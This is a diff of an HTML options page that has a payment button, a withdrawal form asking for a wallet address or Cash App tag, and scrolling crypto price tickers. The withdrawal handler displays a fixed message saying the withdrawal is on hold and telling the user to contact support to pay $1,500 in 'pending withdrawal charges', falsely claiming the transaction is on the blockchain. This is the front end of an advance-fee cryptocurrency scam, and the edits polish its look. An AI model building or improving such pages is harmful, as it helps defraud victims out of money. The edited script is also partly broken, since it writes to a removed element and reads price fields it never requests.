@@ -6,24 +6,16 @@
     <title>Options Page</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: Open Sans, sans-serif;
             text-align: center;
             margin: 0;
             padding: 0;
-            background: linear-gradient(45deg, #2105afe2, #1904a5); /* Bright navy blue gradient */
+            background: linear-gradient(45deg, #031541, #031541); /* Bright navy blue gradient */
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
-        }
-        .crypto-widget {
-            background-color: #ae0e0e;
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            font-size: 14px;
         }
         .container {
             margin-top: 20px;
@@ -66,21 +58,27 @@
             color: #f8f1f1;
         }
         #cryptoTicker {
-            margin-top: 20px;
-            font-size: 18px;
+            margin-top: 15px;
+            font-size: 20px;
             color: white;
             background: #333;
-            padding: 15px;
-            border-radius: 5px;
+            padding: 30px;
+            border-radius: 15px;
             overflow: hidden;
             white-space: nowrap;
+            position: relative;
+            width: 100%;
         }
+        #cryptoTickerContent {
+            position: absolute;
+            white-space: nowrap;
+            will-change: transform;
+        }
+
     </style>
 </head>
 <body>
-    <div class="crypto-widget" id="cryptoWidget">
-        Loading current crypto prices...
-    </div>
+    
 
     <div class="container">
         <h1>Select an option below:</p>
@@ -114,6 +112,11 @@
             </div>
         </div>
     </div>
+<div id="cryptoTicker">
+        <div id="cryptoTickerContent">
+            Loading cryptocurrency prices...
+        </div>
+    </div>
 
     <script>
         const paymentButton = document.getElementById('paymentButton');
@@ -129,7 +132,7 @@
         fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd')
             .then(response => response.json())
             .then(data => {
-                cryptoWidget.textContent = `Bitcoin: $${data.bitcoin.usd}, Ethereum: $${data.ethereum.usd}`;
+                cryptoWidget.textContent = `Bitcoin: $${data.bitcoin.usd}, Ethereum: $${data.ethereum.usd}, DOGE: $${data.dogecoin.usd}, BNB: $${data.bnb.usd }`;
             })
             .catch(() => {
                 cryptoWidget.textContent = 'Failed to load crypto prices.';
@@ -171,7 +174,7 @@
 
 
                 const msg = document.createElement("p");
-                msg.innerHTML = `Processing withdrawal of ${amount}.<p>Please contact support for your pending withdrawal charges of $1,500.<p>Note: This transaction has been registered on the blockchain network!`;
+                msg.innerHTML = `Withdrawal on hold ${amount}.<p>Please contact support for your pending withdrawal charges of $1,500.<p><b>NOTE:<b> This transaction has been registered on the blockchain network!`;
                 msg.style.fontSize = "28px";
                 msg.style.fontWeight = "500";
                 msg.style.color = "#333";
@@ -199,6 +202,44 @@
                 alert('Please enter a valid amount.');
             }
         });
+
+
+    // Fetch and display live cryptocurrency prices
+        const cryptoTickerContent = document.getElementById('cryptoTickerContent');
+        const fetchCryptoPrices = () => {
+            fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,cardano,solana,dogecoin,polkadot&vs_currencies=usd')
+                .then(response => response.json())
+                .then(data => {
+                    cryptoTickerContent.textContent = `BTC: $${data.bitcoin.usd} | ETH: $${data.ethereum.usd} | ADA: $${data.cardano.usd} | SOL: $${data.solana.usd} | DOGE: $${data.dogecoin.usd} | DOT: $${data.polkadot.usd}`;
+                })
+                .catch(() => {
+                    cryptoTickerContent.textContent = 'Failed to load cryptocurrency prices.';
+                });
+        };
+
+        fetchCryptoPrices();
+        setInterval(fetchCryptoPrices, 60000); // Update prices every 60 seconds
+
+        // Animate the ticker
+        const animateTicker = () => {
+            const ticker = document.getElementById('cryptoTicker');
+            const content = document.getElementById('cryptoTickerContent');
+            let startPosition = ticker.offsetWidth;
+
+            const move = () => {
+                startPosition -= 2; // Adjust speed here
+                if (startPosition < -content.offsetWidth) {
+                    startPosition = ticker.offsetWidth;
+                }
+                content.style.transform = `translateX(${startPosition}px)`;
+                requestAnimationFrame(move);
+            };
+
+            move();
+        };
+
+        animateTicker();
+        
     </script>      
     <p style="font-weight: bold; text-align: center; margin-top: 20px; color: #fefbfb;">
             Please make sure your wallet address and Cash App tag is correct, once withdrawal is submitted it's irreversible.
